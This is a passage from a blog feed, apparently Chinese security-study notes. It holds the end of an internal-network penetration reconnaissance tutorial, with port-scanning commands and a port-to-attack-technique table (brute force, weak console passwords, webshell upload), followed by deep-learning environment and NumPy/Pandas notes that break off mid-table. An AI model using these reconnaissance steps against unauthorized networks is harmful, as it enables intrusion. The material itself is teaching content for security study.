&quot;TTL=&quot;</code></p><p><img src="https://s2.ax1x.com/2019/12/22/Qz9Huq.png" alt="Qz9Huq.png"></p></li></ol><ol start="3"><li>通过Arp扫描</li></ol><p><img src="https://s2.ax1x.com/2019/12/22/QzCCK1.png" alt="QzCCK1.png"></p><ol start="4"><li><p>通过常规TCP/UDP端口扫描探测内网</p><p>scanline，Windows 全版本通用，体积小，仅使用单个文件，同时支持对TCP/UDP 的端口扫描</p><p><code>scanline -h -t 22,80-89 -u 53,161,137,139 -O c:\windows\temp\log.txt -p 192.168.55.1-254 /b</code></p><p><img src="https://s2.ax1x.com/2019/12/22/QzCm2d.png" alt="QzCm2d.png"></p></li></ol><h4 id="探测端口信息"><a href="#探测端口信息" class="headerlink" title="探测端口信息"></a>探测端口信息</h4><p>关注三点:</p><ul><li>端口的 Banner 信息。</li><li>端口上运行的服务。</li><li>常见应用的默认端口。</li></ul><p>通过端口扫描我们能够知道计算机开了什么服务，运行了什么程序。</p><p>例如Apache，Tomcat等中间件中，存在管理控制台manager，可以尝试弱口令或者暴力破解登入，也可以通过控制台上传jsp、war等格式的webshell。或者Zabbix 监控工具默认密码没有更改，可以通过弱口令登录控制线上机器等，以此来拿下其他内网机器，得到更多信息。</p><ol><li>使用Telnet</li></ol><p>但现在大多数多关闭这个服务了，需要重新开启，如果只是想快速地探测某主机的某个常规高危端口是否开放，Telnet 命令是最方便的</p><ol start="2"><li>S 扫描器</li></ol><p>S 扫描器是早期的一种比较快速的端口扫描工具，特别适合运行在Windows Sever 2003 以下的平台上，支持大网段扫描。S 扫描器的扫描结果默认保存在其目录下的result.txt 文件中。推荐使用TCP 扫描，命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">S.exe TCP 192.168.1.1 192.168.1.254</span><br><span class="line">445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111</span><br><span class="line">256 /Banner /save</span><br></pre></td></tr></table></figure><p>3.msf的模块</p><p>4.nmap扫描</p><p>不推荐，动静太大</p><p>下边是一些常见的端口号信息，测试的时候需要耐心去一个个测</p><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击技巧</th></tr></thead><tbody><tr><td>21/22/69</td><td>ftp/tftp：文件传输协议</td><td>爆破\嗅探\溢出\后门</td></tr><tr><td>22</td><td>ssh：远程连接</td><td>爆破OpenSSH；28个退格</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破\嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS：域名系统</td><td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td></tr><tr><td>67/68</td><td>dhcp</td><td>劫持\欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破</td></tr><tr><td>139</td><td>samba</td><td>爆破\未授权访问\远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>爆破</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ldap</td><td>注入攻击\未授权访问</td></tr><tr><td>512/513/514</td><td>linux r</td><td>直接使用rlogin</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破：进行内网渗透</td></tr><tr><td>1352</td><td>lotus</td><td>爆破：弱口令\信息泄漏：源代码</td></tr><tr><td>1433</td><td>mssql</td><td>爆破：使用系统用户登录\注入攻击</td></tr><tr><td>1521</td><td>oracle</td><td>爆破：TNS\注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破\拒绝服务\注入</td></tr><tr><td>3389</td><td>rdp</td><td>爆破\Shift后门</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破：控制台弱口令\认证绕过</td></tr><tr><td>5000</td><td>sybase/DB2</td><td>爆破\注入</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出\注入攻击\爆破：弱口令</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务\代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破：弱口令\认证绕过</td></tr><tr><td>6379</td><td>redis</td><td>未授权访问\爆破：弱口令</td></tr><tr><td>7001</td><td>weblogic</td><td>Java反序列化\控制台弱口令\控制台部署webshell</td></tr><tr><td>80/443/8080</td><td>web</td><td>常见web攻击\控制台爆破\对应服务器版本漏洞</td></tr><tr><td>8069</td><td>zabbix</td><td>远程命令执行</td></tr><tr><td>9090</td><td>websphere控制台</td><td>爆破：控制台弱口令\Java反序列</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破\未授权访问</td></tr></tbody></table><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>上面是一些常规信息收集的工具但现在由于powershell的出现还有其他使用powershell进行信息收集的方法，动静会比较小，会在后面的文章进行介绍</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;内网信息收集&quot;&gt;&lt;a href=&quot;#内网信息收集&quot; class=&quot;headerlink&quot; title=&quot;内网信息收集&quot;&gt;&lt;/a&gt;内网信息收集&lt;/h3&gt;&lt;p&gt;主要还是常规操作，过一遍
    
    </summary>
    
      <category term="内网渗透学习" scheme="0verwatch.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="内网渗透" scheme="0verwatch.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>从零学习深度学习与Web安全</title>
    <link href="0verwatch.top/DL-WebSecurity-learning.html"/>
    <id>0verwatch.top/DL-WebSecurity-learning.html</id>
    <published>2019-12-21T00:53:42.000Z</published>
    <updated>2019-12-23T00:55:33.571Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>毕设要做，大概思路就是做一个类似D盾的扫描器，但是核心使用深度学习去进行研发，最后封装成一个Web端或者是一个客户端吧，实习期间断断续续地学，尽量在春节之后能够把核心的东西做出来吧。</p><p>先记录一些点吧，比较零散，不知道怎么系统学,<a id="more"></a>服了。。。</p><h3 id="环境的一些操作"><a href="#环境的一些操作" class="headerlink" title="环境的一些操作"></a>环境的一些操作</h3><h4 id="conda的使用"><a href="#conda的使用" class="headerlink" title="conda的使用"></a>conda的使用</h4><p>为啥使用Anconda？因为Anconda比较好的一点就是集成了大量数学的包，因为有些数学包在自己安装的时候总会出错。</p><p><code>conda list</code> 查看anaconda预装哪些包</p><p><code>conda [env] create</code> 创建环境<br>比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda create -n dl_security python=3.5</span><br></pre></td></tr></table></figure><p>创建一个python3.5名为dl_security的环境  -n指的是环境名字</p><p><code>conda [env] remove -n</code>   移除环境<br>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda remove -n dl_test</span><br></pre></td></tr></table></figure><p>这上面的env可以不添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda env list</span><br></pre></td></tr></table></figure><p>查看我们已经安装的虚拟环境，这东西跟python那个virtualenv没啥别233333</p><p>在安装一些包的时候，除了我们常用的<code>pip isntall</code>之外我们还可以使用<code>conda install</code><br>这两个其实没啥区别，除了TensorFlow只支持pip安装之外，所以一开始最好还是使用pip install先<br>如果存在的某些包比较陈旧，可以使用<code>pip install upgrade +你所要检测并升级的包名</code></p><p>指定源更新的话可可以使用<code>-i</code>参数<br>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install numpy -i http://pypi.douban.com/simple</span><br></pre></td></tr></table></figure><p>进入新弄的环境中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">activate dl_security</span><br></pre></td></tr></table></figure><p>退出当前环境 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate [环境名]</span><br></pre></td></tr></table></figure><p>使用pip安装TensorFlow<br>cpu版本：tensorflow<br>gpu版本：tensorflow-gpu</p><p>GPU加速，CPU的10倍<br>使用GPU的话最好是电脑存在英伟达的显卡，最好显卡内存为4G<br>batch的问题  显存/内存</p><p>用GPU的话还需要两个插件cuda，cudnn这两个都是英伟达用于显卡加速的插件<br>一般来说gtx-1080很多任务都可以实现的了</p><p>在双显卡的台式机上，我们使用的是独显，Win要注意在BIOS上设置，Linux要退出图形化界面，使用命令行</p><p>当我们pip install的一些包遇到编译问题的时候，可以使用这个网站上已经编译好的轮子</p><p>编译好的轮子安装网站：<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" target="_blank" rel="noopener">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a></p><h4 id="jupyter的使用"><a href="#jupyter的使用" class="headerlink" title="jupyter的使用"></a>jupyter的使用</h4><p>进入某个目录然后使用命令 <code>jupyter notebook</code>打开，会产生一个token值</p><p><img src="https://s2.ax1x.com/2019/12/22/QzVX9K.png" alt="QzVX9K.png"></p><p>进去之后该如何新建一个环境，文件名在右上角修改</p><p><img src="https://s2.ax1x.com/2019/12/22/QzVbA1.png" alt="QzVbA1.png"></p><p>在运行部出来的时候，可以通过kernel重启python内核</p><p><img src="https://s2.ax1x.com/2019/12/22/QzVxje.png" alt="QzVxje.png"></p><p>在方块内使用<code>shift+回车</code>  无论在哪种模式下都可以运行效果</p><p>对于出现的执行效果  单击是选中它是蓝色的，此时可以使用很多快捷键，比如按一下m就会变成Markdown模式，双击是编辑它是绿色的，是编辑模式，按ESC可以返回命令模式，也就是蓝色的方框</p><p>另外code模式下前面的<code>In [*]</code>代表的是正在忙， 出现数字就代表是第几步的执行代码</p><p>对于函数变量的补全可以使用<code>tab</code>键</p><p>查看函数的一些解释可以使用<code>help</code>函数去进行查看</p><p><code>shift+tab</code>可以显示某个函数的一些文档信息</p><p><img src="https://s2.ax1x.com/2019/12/22/QzZ83T.png" alt="QzZ83T.png"></p><p>创建单元格，在某个单元格的地方创建，在上方创建按<code>A</code>，在下方创建按<code>B</code></p><p>按<code>H</code>会弹出常用的热键</p><p><img src="https://s2.ax1x.com/2019/12/22/QzZuHs.png" alt="QzZuHs.png"></p><p>显示行号 按<code>L</code></p><p>jupyter还能够导出html等各种格式，在file选项下download as模块下</p><p><img src="https://s2.ax1x.com/2019/12/22/QzZGgU.png" alt="QzZGgU.png"></p><h4 id="Numpy部分"><a href="#Numpy部分" class="headerlink" title="Numpy部分"></a>Numpy部分</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">array_a = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_a</span><br></pre></td></tr></table></figure><pre><code>array([[1, 2, 3],       [2, 3, 4]])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_a.shape</span><br></pre></td></tr></table></figure><pre><code>(2, 3)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看维度</span></span><br><span class="line">array_a.ndim</span><br></pre></td></tr></table></figure><pre><code>2</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_a.size  <span class="comment">#一共有多少个元素</span></span><br></pre></td></tr></table></figure><pre><code>6</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_a.dtype <span class="comment">#描述数组中元素的类型</span></span><br></pre></td></tr></table></figure><pre><code>dtype(&apos;int32&apos;)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_a.itemsize  <span class="comment">#数组中每个元素的大小（以字节为单位）</span></span><br></pre></td></tr></table></figure><pre><code>4</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_a.data</span><br></pre></td></tr></table></figure><pre><code>&lt;memory at 0x000002150B23F558&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_a = np.arange(<span class="number">15</span>)    <span class="comment">#产生矩阵元素的个数 一开始的话就是一个简单一维</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_a</span><br></pre></td></tr></table></figure><pre><code>array([ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_b= array_a.reshape(<span class="number">3</span>,<span class="number">5</span>)  <span class="comment">#重新构造矩阵结构必须要符合元素个数，返回需要赋值给某个定义变量</span></span><br></pre></td></tr></table></figure><pre><code>array([[ 0,  1,  2,  3,  4],       [ 5,  6,  7,  8,  9],       [10, 11, 12, 13, 14]])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##  zeros  ones 函数的用法   一样的效果</span></span><br><span class="line">array_b = np.zeros((<span class="number">3</span>,<span class="number">4</span>))  <span class="comment">#3行4列都是0</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_b</span><br></pre></td></tr></table></figure><pre><code>array([[0., 0., 0., 0.],       [0., 0., 0., 0.],       [0., 0., 0., 0.]])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_b = np.ones((<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_b</span><br></pre></td></tr></table></figure><pre><code>array([[[1., 1., 1., 1.],        [1., 1., 1., 1.],        [1., 1., 1., 1.]],       [[1., 1., 1., 1.],        [1., 1., 1., 1.],        [1., 1., 1., 1.]]])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array_a = np.zeros_like(array_a.shape)</span><br><span class="line">array_a</span><br></pre></td></tr></table></figure><pre><code>array([0, 0, 0])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_b.sum()</span><br></pre></td></tr></table></figure><pre><code>24.0</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_b.min()</span><br></pre></td></tr></table></figure><pre><code>1.0</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array_d = np.ones((<span class="number">5</span>,<span class="number">5</span>))</span><br><span class="line">print(array_d)</span><br><span class="line">array_d = array_d [<span class="number">0</span>:<span class="number">4</span>,<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">print(array_d)</span><br></pre></td></tr></table></figure><pre><code>[[1. 1. 1. 1. 1.] [1. 1. 1. 1. 1.] [1. 1. 1. 1. 1.] [1. 1. 1. 1. 1.] [1. 1. 1. 1. 1.]][[1. 1. 1. 1.] [1. 1. 1. 1.] [1. 1. 1. 1.] [1. 1. 1. 1.]]</code></pre><h4 id="Pandas部分"><a href="#Pandas部分" class="headerlink" title="Pandas部分"></a>Pandas部分</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy  <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = pd.Series([<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,np.nan,<span class="number">7</span>,<span class="number">9</span>])  <span class="comment">#初始化构造</span></span><br><span class="line">s</span><br></pre></td></tr></table></figure><pre><code>0    1.01    3.02    5.03    NaN4    7.05    9.0dtype: float64</code></pre><h5 id="通过pd传入np数组创建数据帧"><a href="#通过pd传入np数组创建数据帧" class="headerlink" title="通过pd传入np数组创建数据帧"></a>通过pd传入np数组创建数据帧</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">datas  = pd.date_range(<span class="string">'20130101'</span>,periods=<span class="number">6</span>)  <span class="comment">#创建时间列表，periods代表的是几天</span></span><br><span class="line">print(<span class="string">"datas: \n&#123;&#125;"</span>.format(datas))</span><br><span class="line">df = pd.DataFrame(np.random.randn(<span class="number">6</span>,<span class="number">4</span>),index=datas,columns =list(<span class="string">'ABCD'</span>))  <span class="comment">#构建数据表格</span></span><br><span class="line">df</span><br></pre></td></tr></table></figure><pre><code>datas: DatetimeIndex([&apos;2013-01-01&apos;, &apos;2013-01-02&apos;, &apos;2013-01-03&apos;, &apos;2013-01-04&apos;,               &apos;2013-01-05&apos;, &apos;2013-01-06&apos;],              dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;)</code></pre><table border="1" class="dataframe"><br>  <thead><br>    <tr style="text-align: right;"><br>      <th></th><br>      <th>A</th><br>      <th>B</th><br>      <th>C</th><br>      <th>D</th><br>    </tr><br>  </thead><br>  <tbody><br>    <tr><br>      <th>2013-01-01</th><br>      <td>-0.042893</td><br>      <td>0.260564</td><br>      <td>0.731754</td><br>      <td>1.447731</td><br>    </tr><br>    <tr><br>      <th>2013-01-02</th><br>      <td>-1.282021</td><br>      <td>-0.848987</td><br>      <td>0.823437</td><br>      <td>0.004012</td><br>    </tr><br>    <tr><br>      <th>2013-01-03</th><br>      <td>-1.107000</td><br>      <td>2.724175</td><br>      <td>-0.571516</td><br>      <td>0.897330</td><br>    </tr><br>    <tr><br>      <th>2013-01-04</th><br>      <td>1.550847</td><br>      <td>-0.145260</td><br>      <td>-0.334988</td><br>      <td>0.494642</td><br>    </tr><br>    <tr><br>      <th>2013-01-05</th><br>      <td>0.304897</td><br>      <td>0.398448</td><br>      <td>1.151775</td><br>      <td>0.846324</td><br>    </tr><br>    <tr><br>      <th>2013-01-06</th><br>      <td>0.484135</td><br>      <td>-0.450565</td><br>      <td>1.385415</td><br>      <td>-0.709135</td><br>    </tr><br>  </tbody><br></table><h5 id="通过字典创建"><a href="#通过字典创建" class="headerlink" title="通过字典创建"></a>通过字典创建</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">df2 = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">'A'</span>:<span class="number">1.</span>,</span><br><span class="line">    <span class="string">'B'</span>: pd.Timestamp(<span class="string">'20131202'</span>),</span><br><span class="line">    <span class="string">'C'</span>: pd.Series(<span class="number">1</span>,index=list(range(<span class="number">4</span>)),dtype=<span class="string">'float32'</span>),</span><br><span class="line">    <span class="string">'D'</span> : np.array([<span class="number">3</span>]*<span class="number">4</span> , dtype=<span class="string">'int32'</span>),</span><br><span class="line">    <span class="string">'E'</span> : pd.Categorical([<span class="string">"test"</span>,<span class="string">"train"</span>,<span class="string">"test"</span>,<span class="string">"train"</span>]),</span><br><span class="line">    <span class="string">'F'</span> : <span class="string">'foo'</span></span><br><span class="line">&#125;)</span><br><span class="line">df2</span><br></pre></td></tr></table></figure><table border="1" class="dataframe"><br>  <thead><br>    <tr style="text-align: right;"><br>      <th></th><br>      <th>A</th><br>      <th>B</th><br>      <th>C</th><br>      <th>D</th><br>      <th>E</th><br>      <th>F</th><br>    </tr><br>  </thead><br>  <tbody><br>    <tr><br>      <th>0</th><br>      <td>1.0</td><br>      <td>2013-12-02</td><br>      <td>1.0</td><br>      <td>3</td><br>      <td>test</td><br>      <td>foo</td><br>    </tr><br>    <tr><br>      <th>1</th><br>      <td>1.0</td><br>      <td>2013-12-02</td><br>      <td>1.0</td><br>      <td>3</td><br>      <td>train</td><br>      <td>foo</td><br>    </tr><br>    <tr><br>      <th>2</th><br>      <td>1.0</td><br>      <td>2013-12-02</td><br>      <td>1.0</td><br>      <td>3</td><br>      <td>test</td><br>      <td>foo</td><br>    </tr><br>    <tr><br>      <th>3</th><br>      <td>1.0</td><br>      <td>2013-12-02</td><br>      <td>1.0</td><br>      <td>3</td><br>      <td>train</td><br>      <td>foo</td><br>    </tr><br>  </tbody><br></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df2.dtypes  <span class="comment">#通过这个方法可以查看每一个列对应的数据类型</span></span><br></pre></td></tr></table></figure><pre><code>A           float64B    datetime64[ns]C           float32D             int32E          categoryF            objectdtype: object</code></pre><h5 id="Viewing-Data-这一部分主要是查看数据"><a href="#Viewing-Data-这一部分主要是查看数据" class="headerlink" title="Viewing   Data   这一部分主要是查看数据"></a>Viewing   Data   这一部分主要是查看数据</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.head()   <span class="comment">#查看前五条的数据</span></span><br></pre></td></tr></table></figure><table border="1" class="dataframe"><br>  <thead><br>    <tr style="text-align: right;"><br>      <th></th><br>      <th>A</th><br>      <th>B</th><br>      <th>C</th><br>      <th>D</th><br>    </tr><br>  </thead><br>  <tbody><br>    <tr><br>      <th>2013-01-01</th><br>      <td>-0.042893</td><br>      <td>0.260564</td><br>      <td>0.731754</td><br>      <td>1.447731</td><br>    </tr><br>    <tr><br>      <th>2013-01-02</th><br>      <td>-1.282021</td><br>      <td>-0.848987</td><br>      <td>0.823437</td><br>      <td>0.004012</td><br>    </tr><br>    <tr><br>      <th>2013-01-03</th><br>      <td>-1.107000</td><br>      <td>2.724175</td><br>      <td>-0.571516</td><br>      <td>0.897330</td><br>    </tr><br>    <tr><br>      <th>2013-01-04</th><br>      <td>1.550847</td><br>      <td>-0.145260</td><br>      <td>-0.334988</td><br>      <td>0.494642</td><br>    </tr><br>    <tr><br>      <th>2013-01-05</th><br>      <td>0.304897</td><br>      <td>0.398448</td><br>      <td>1.151775</td><br>      <td>0.846324</td><br>    </tr><br>  </tbody><br></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.tail(<span class="number">3</span>)  <span class="comment">#这个可以指定输出表格最后的几条数据</span></span><br></pre></td></tr></table></figure><table border="1" class="dataframe"><br>  <thead><br>    <tr style="text-align: right;"><br>      <th></th><br>      <th>A</th><br>      <th>B</th><br>      <th>C</th><br>      <th>D</th><br>    </tr><br>  </thead><br>  <tbody><br>    <tr><br>      <th>2013-01-04</th><br>      <td>1.550847</td><br>      <td>-0.145260</td><br>      <td>-0.334988</td><br>      <td>0.494642</td><br>    </tr><br>    <tr><br>      <th>2013-01-05</th><br>      <td>0.304897</td><br>      <td>0.398448</td><br>      <td>1.151775</td><br>      <td>0.846324</td><br>    </tr><br>    <tr><br>      <th>2013-01-06</th><br>      <td>0.484135</td><br>      <td>-0.450565</td><br>      <td>1.385415</td><br>      <td>-0.709135</td><br>    </tr><br>  </tbody><br></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.index  <span class="comment">#返回索引index</span></span><br></pre></td></tr></table></figure><pre><code>DatetimeIndex([&apos;2013-01-01&apos;, &apos;2013-01-02&apos;, &apos;2013-01-03&apos;, &apos;2013-01-04&apos;,               &apos;2013-01-05&apos;, &apos;2013-01-06&apos;],              dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.columns <span class="comment">#返回列名</span></span><br></pre></td></tr></table></figure><pre><code>Index([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;], dtype=&apos;object&apos;)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.values <span class="comment">#返回值</span></span><br></pre></td></tr></table></figure><pre><code>array([[-0.04289317,  0.26056382,  0.73175352,  1.44773096],       [-1.28202056, -0.84898723,  0.82343711,  0.00401215],       [-1.10700031,  2.72417496, -0.57151597,  0.89733044],       [ 1.55084706, -0.14525989, -0.33498829,  0.49464239],       [ 0.30489747,  0.39844829,  1.15177483,  0.84632382],       [ 0.48413527, -0.45056543,  1.38541479, -0.70913464]])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.describe()  <span class="comment">#快速返回表格的概括</span></span><br></pre></td></tr></table></figure><table border="1" class="dataframe"><br>  <thead><br>    <tr style="text-align: right;"><br>      <th></th><br>      <th>A</th><br>      <th>B</th><br>      <th>C</th><br>      <th>D</th><br>    </tr><br>  </thead><br>  <tbody><br>    <tr><br>      <th>count</th><br>      <td>6.000000</td><br>      <td>6.000000</td><br>      <td>6.000000</td><br>      <td>6.000000</td><br>    </tr><br>    <tr><br>      <th>mean</th><br>      <td>-0.015339</td><br>      <td>0.323062</td><br>      <td>0.530979</td><br>      <td>0.496818</td><br>    </tr><br>    <tr><br>      <th>std</th><br>      <td>1.058483</td><br>      <td>1.262256</td><br>      <td>0.800835</td><br>      <td>0.759471</td><br>    </tr><br>    <tr><br>      <th>min</th><br>      <td>-1.282021</td><br>      <td>-0.848987</td><br>      <td>-0.571516</td><br>      <td>-0.709135</td><br>    </tr><br>    <tr><br>      <th>25%</th><br>      <td>-0.840974</td><br>      <td>-0.374239</td><br>      <td>-0.068303</td><br>      <td>0.126670</td><br>    </tr><br>    <tr><br>      <th>50%</th><br>      <td>0.131002</td><br>      <td>0.057652</td><br>      <td>0.777595</td><br>      <td>0.670483</td><br>    </tr><br>    <tr><br>      <th>75%</th><br>      <td>0.439326</td><br>      <td>0.363977</td><br>      <td>1.069690</td><br>      <td>0.884579</td><br>    </tr><br>    <tr><br>      <th>max</th><br>      <td>1.550847</td><br>      <td>2.724175</td><br>      <td>1.385415</td><br>      <td>1.447731</td><br>    </tr><br>  </tbody><br></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.T   <span class="comment">#转置的意思   numpy里面也有类似的功能</span></span><br></pre></td></tr></table></figure><table border="1" class="dataframe"><br>  <thead><br>    <tr style="text-align: right;"><br>      <th></th><br>      <th>2013-01-01</th><br>      <th>2013-01-02</th><br>      <th>2013-01-03</th><br>      <th>2013-01-04</th><br>      <th>2013-01-05</th><br>      <th>2013-01-06</th><br>    </tr><br>  </thead><br>  <tbody><br>    <tr><br>      <th>A</th><br>      <td>-0.042893</td><br>      <td>-1.282021</td><br>      <td>-1.107000</td><br>      <td>1.550847</td><br>      <td>0.304897</td><br>      <td>0.484135</td><br>    </tr><br>    <tr><br>      <th>B</th><br>      <td>0.260564</td><br>      <td>-0.848987</td><br>      <td>2.724175</td><br>      <td>-0.145260</td><br>      <td>0.398448</td><br>      <td>-0.450565</td><br>    </tr><br>    <tr><br>      <th>C</th><br>      <td>0.731754</td><br>      <td>0.823437</td><br>      <td>-0.571516</td><br>      <td>-0.334988</td><br>      <td>1.151775</td><br>      <td>1.385415</td><br>    </tr><br>    <tr><br>      <th>D</th><br>      <td>1.447731</td><br>      <td>0.004012</td><br>      <td>0.897330</td><br>      <td>0.494642</td><br>      <td>0.846324</td><br>      <td>-0.709135</td><br>    </tr><br>  </tbody><br></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.sort_index(axis=<span class="number">1</span>, ascending=<span class="keyword">False</span> )  <span class="comment"># 针对index排序  axis代表第一个轴 改为0的话就会按照日期的那一列进行排序 ascending 默认升序  False 代表降序</span></span><br></pre></td></tr></table></figure><table border="1" class="dataframe"><br>  <thead><br>    <tr style="text-align: right;"><br>      <th></th><br>      <th>D</th><br>      